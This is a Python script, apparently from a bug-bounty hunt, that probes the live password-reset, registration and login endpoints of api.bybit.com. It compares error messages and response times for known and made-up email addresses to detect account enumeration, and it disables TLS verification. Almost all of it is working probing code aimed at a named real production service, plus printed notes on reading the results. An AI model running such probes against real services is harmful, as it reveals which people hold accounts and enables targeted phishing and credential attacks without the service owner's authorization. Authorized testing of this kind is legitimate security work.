#!/usr/bin/env python3
"""
Email Enumeration Testing
Different error messages for existing vs non-existing accounts = vulnerability
"""
import requests
import time

requests.packages.urllib3.disable_warnings()

print("="*80)
print("EMAIL ENUMERATION TESTING")
print("="*80)

# Test emails
test_cases = [
    ("existing", "support@bybit.com"),  # Likely exists
    ("nonexistent", "thisemaildefin1tely43doesntexist999@bybit.com"),  # Likely doesn't exist
    ("your_email", "bounty_hunt@push.tg"),  # Your actual email
]

endpoints = [
    ("Password Reset", "POST", "https://api.bybit.com/user/v1/password/forgot", {"email": ""}),
    ("Registration", "POST", "https://api.bybit.com/user/v1/create", {"email": "", "password": "Test123!"}),
    ("Login", "POST", "https://api.bybit.com/user/v1/login", {"email": "", "password": "wrongpass"}),
]

print("\n[1] Testing Password Reset Endpoint")
print("-" * 80)

for name, email in test_cases:
    try:
        r = requests.post(
            "https://api.bybit.com/user/v1/password/forgot",
            json={"email": email},
            verify=False,
            timeout=5
        )
        
        print(f"\nTest: {name} ({email})")
        print(f"  Status: {r.status_code}")
        
        try:
            data = r.json()
            ret_code = data.get('retCode')
            ret_msg = data.get('retMsg', '')
            
            print(f"  RetCode: {ret_code}")
            print(f"  RetMsg: {ret_msg}")
            
        except:
            print(f"  Response: {r.text[:100]}")
            
        time.sleep(1)  # Be nice
        
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "-" * 80)
print("🔍 ANALYSIS:")
print("-" * 80)

print("""
If error messages are DIFFERENT for existing vs non-existing emails:
  → Email Enumeration vulnerability (Medium severity)

Example vulnerable responses:
  - Existing: "Password reset link sent"
  - Non-existing: "Email not found"

Example SAFE responses:
  - Both: "If email exists, reset link will be sent"
""")

# Test 2: Registration enumeration
print("\n\n[2] Testing Registration Endpoint")
print("-" * 80)

for name, email in test_cases:
    try:
        r = requests.post(
            "https://api.bybit.com/user/v1/create",
            json={"email": email, "password": "TestPassword123!"},
            verify=False,
            timeout=5
        )
        
        print(f"\nTest: {name} ({email})")
        print(f"  Status: {r.status_code}")
        
        try:
            data = r.json()
            print(f"  RetCode: {data.get('retCode')}")
            print(f"  RetMsg: {data.get('retMsg', '')}")
        except:
            print(f"  Response: {r.text[:100]}")
            
        time.sleep(1)
        
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "-" * 80)
print("🔍 ANALYSIS:")
print("-" * 80)

print("""
If messages differ:
  - Existing: "Email already registered"
  - Non-existing: "Validation error" or "Invalid email format"
  
  → Email Enumeration via Registration
""")

# Test 3: Timing attack
print("\n\n[3] Testing Timing-Based Enumeration")
print("-" * 80)

print("\nMeasuring response times:")

for name, email in test_cases[:2]:  # Test only 2
    try:
        start = time.time()
        
        r = requests.post(
            "https://api.bybit.com/user/v1/login",
            json={"email": email, "password": "wrongpassword"},
            verify=False,
            timeout=5
        )
        
        elapsed = time.time() - start
        
        print(f"\n{name}: {elapsed:.3f}s")
        
        try:
            data = r.json()
            print(f"  RetCode: {data.get('retCode')}")
        except:
            pass
            
    except:
        pass

print("\n" + "-" * 80)
print("🔍 ANALYSIS:")
print("""
If response times significantly differ (>100ms difference):
  → Timing-based enumeration possible
  
This happens when:
  - Existing email: System checks password (slow)
  - Non-existing: Returns immediately (fast)
""")

print("\n" + "="*80)
print("EMAIL ENUMERATION TEST COMPLETE")
print("="*80)
